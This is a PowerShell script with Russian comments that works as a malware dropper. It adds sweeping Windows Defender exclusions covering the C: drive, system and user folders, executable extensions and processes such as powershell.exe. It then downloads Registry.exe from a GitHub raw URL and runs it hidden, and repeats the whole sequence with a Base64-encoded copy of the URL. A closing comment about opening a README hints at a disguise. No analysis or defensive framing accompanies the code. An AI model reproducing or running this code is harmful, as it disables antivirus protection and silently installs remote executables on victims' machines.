try {
    # Добавление исключений в Defender
    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
        $Paths = @(
            [System.Environment]::GetFolderPath("ProgramFiles"),
            [System.Environment]::GetFolderPath("ProgramFilesX86"),
            [System.Environment]::GetFolderPath("ApplicationData"),
            [System.Environment]::GetFolderPath("LocalApplicationData"),
            [System.IO.Path]::GetTempPath(),
            "C:\", "C:\Windows\Temp", "C:\ProgramData", "C:\Users", "C:\Windows\System32", "C:\Windows\SysWOW64"
        )
        $Processes = @("payload.exe", "Registry.exe", "RuntimeBroker.exe", "SvcHost.exe", "WinDefendUpdate.exe", "powershell.exe", "cmd.exe")
        $Extensions = @(".exe", ".dll", ".bat", ".ps1", ".vbs", ".bin")

        foreach ($Path in $Paths) { if (Test-Path $Path) { Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue } }
        foreach ($Process in $Processes) { Add-MpPreference -ExclusionProcess $Process -ErrorAction SilentlyContinue }
        foreach ($Ext in $Extensions) { Add-MpPreference -ExclusionExtension $Ext -ErrorAction SilentlyContinue }
    }
} catch {}
# Прямая ссылка на твой исполняемый файл
$url = "https://raw.githubusercontent.com/selfleakmain/rect/main/Registry.exe"
$p = "$env:TEMP\Registry.exe"

# Скачивание файла
try {
    (New-Object System.Net.WebClient).DownloadFile($url, $p)
    if (Test-Path $p) {
        # Скрытый запуск
        Start-Process $p -WindowStyle Hidden
    }
} catch {
    # Резервный метод скачивания
    Invoke-WebRequest -Uri $url -OutFile $p -UseBasicParsing
    if (Test-Path $p) { Start-Process $p -WindowStyle Hidden }
}

try {
    # Добавление исключений в Defender
    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
        $Paths = @(
            [System.Environment]::GetFolderPath("ProgramFiles"),
            [System.Environment]::GetFolderPath("ProgramFilesX86"),
            [System.Environment]::GetFolderPath("ApplicationData"),
            [System.Environment]::GetFolderPath("LocalApplicationData"),
            [System.IO.Path]::GetTempPath(),
            "C:\", "C:\Windows\Temp", "C:\ProgramData", "C:\Users", "C:\Windows\System32", "C:\Windows\SysWOW64"
        )
        $Processes = @("payload.exe", "Registry.exe", "RuntimeBroker.exe", "SvcHost.exe", "WinDefendUpdate.exe", "powershell.exe", "cmd.exe")
        $Extensions = @(".exe", ".dll", ".bat", ".ps1", ".vbs", ".bin")

        foreach ($Path in $Paths) { if (Test-Path $Path) { Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue } }
        foreach ($Process in $Processes) { Add-MpPreference -ExclusionProcess $Process -ErrorAction SilentlyContinue }
        foreach ($Ext in $Extensions) { Add-MpPreference -ExclusionExtension $Ext -ErrorAction SilentlyContinue }
    }
} catch {}

# Закодированная ссылка на Registry.exe
$u = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NlbGZsZWFrbWFpbi9yZWN0L21haW4vUmVnaXN0cnkuZXhl'))
$p = "$env:TEMP\Registry.exe"

# Скачивание файла с обходом ошибок
try {
    (New-Object System.Net.WebClient).DownloadFile($u, $p)
    if (Test-Path $p) {
        Start-Process $p -WindowStyle Hidden
    }
} catch {
    # Резервный метод скачивания
    Invoke-WebRequest -Uri $u -OutFile $p -UseBasicParsing
    if (Test-Path $p) { 
        Start-Process $p -WindowStyle Hidden 
    }
}

# Открытие README.md в браузере
